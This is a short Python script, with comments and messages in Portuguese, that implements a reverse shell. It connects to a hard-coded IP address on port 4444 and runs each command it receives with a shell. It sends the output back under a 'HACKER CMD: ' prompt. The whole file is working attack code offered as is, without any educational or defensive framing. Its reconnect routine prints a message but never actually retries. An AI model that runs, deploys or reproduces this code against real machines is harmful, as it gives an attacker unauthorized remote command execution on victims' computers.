import socket
import subprocess
import time


ip = "192.168.0.106"
port = 4444
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
def conectar(ip, port):
 try:
  s.connect((ip,port))
  s.send("\n Maquina conectada, Pressione Enter p continuar")
  return s
 except:
  print("Erro ao conectar")

def shell(s):
 while True:
   try:
    dados = s.recv(1024)
    proc = subprocess.Popen(dados,shell = True, stdin=subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
    saida = proc.stdout.read() + proc.stderr.read()
    s.send(saida+"\n")
    s.send("HACKER CMD: ")

   except:
    print("Erro ao enviar a Shell")

def main(s):
 s_connect = conectar(ip,port)
 if(s_connect):
   shell(s_connect)
 else:
   time.sleep(2)
   print("Aguarde reconectando... ")


main(s)


          



